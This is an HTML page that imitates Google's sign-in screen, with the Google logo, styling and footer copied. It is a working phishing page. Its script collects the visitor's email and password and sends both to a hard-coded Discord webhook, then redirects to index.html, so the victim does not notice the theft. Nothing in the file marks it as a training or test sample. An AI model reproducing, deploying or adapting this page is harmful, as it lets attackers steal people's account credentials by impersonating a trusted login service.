
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            color: #202124;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        .login-container {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .google-logo {
            margin-bottom: 24px;
        }
        
        h1 {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 12px;
            text-align: center;
        }
        
        .subtitle {
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 32px;
            text-align: center;
        }
        
        .form-group {
            width: 100%;
            margin-bottom: 24px;
        }
        
        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #5f6368;
        }
        
        .form-group input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            color: #202124;
            outline: none;
        }
        
        .form-group input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .forgot-email {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 32px;
        }
        
        .forgot-email:hover {
            text-decoration: underline;
        }
        
        .guest-mode {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 32px;
        }
        
        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        
        .guest-mode a:hover {
            text-decoration: underline;
        }
        
        .button-container {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .next-button {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .next-button:hover {
            background-color: #1765cc;
            box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);
        }
        
        .footer {
            width: 450px;
            padding: 20px 0;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #5f6368;
        }
        
        .footer select {
            background: none;
            border: none;
            color: #5f6368;
            font-size: 12px;
            cursor: pointer;
        }
        
        .footer-links {
            display: flex;
            gap: 24px;
        }
        
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 500px) {
            .login-container {
                width: 100%;
                max-width: 450px;
                border: none;
                padding: 24px 20px;
            }
            
            .footer {
                width: 100%;
                max-width: 450px;
                flex-direction: column;
                gap: 12px;
                align-items: center;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="google-logo">
            <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                <g id="qaEJec">
                    <path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
                </g>
                <g id="YGlOvc">
                    <path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
                </g>
                <g id="BWfIk">
                    <path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
                </g>
                <g id="e6m3fd">
                    <path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
                </g>
                <g id="vbkDmc">
                    <path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
                </g>
                <g id="idEJde">
                    <path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
                </g>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>
        
        <form id="googleLoginForm">
            <div class="form-group">
                <input type="email" id="email" placeholder="Email or phone" required>
            </div>
            
            <a href="#" class="forgot-email">Forgot email?</a>
            
            <p class="guest-mode">
                Not your computer? Use Guest mode to sign in privately.
                <br>
                <a href="#">Learn more</a>
            </p>
            
            <div class="button-container">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-button">Next</button>
            </div>
        </form>
    </div>
    
    <div class="footer">
        <select>
            <option>English (United States)</option>
            <option>Espa\u00f1ol</option>
            <option>Fran\u00e7ais</option>
            <option>Portugu\u00eas (Brasil)</option>
        </select>
        
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        document.getElementById('googleLoginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            
            // Show password field
            const formGroup = document.querySelector('.form-group');
            formGroup.innerHTML = `
                <label for="password">Enter your password</label>
                <input type="password" id="password" placeholder="Password" required>
            `;
            
            document.querySelector('.forgot-email').textContent = 'Forgot password?';
            
            // Change form submission behavior
            this.onsubmit = function(e) {
                e.preventDefault();
                const password = document.getElementById('password').value;
                
                // Send to webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1416026764571967488/o-mWApQR8r8nNh8SdQMNNqo8zG9X64Qorars8cQFzA0dWN9RfguNQopN4u4btj1AzWqt';
                
                const payload = {
                    content: `Google Login Attempt\
Email: ${email}\
Password: ${password}`
                };
                
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                }).then(() => {
                    // Redirect to main app
                    window.location.href = 'index.html';
                }).catch(error => console.error('Error:', error));
            };
        });
    </script>
</body>
</html>
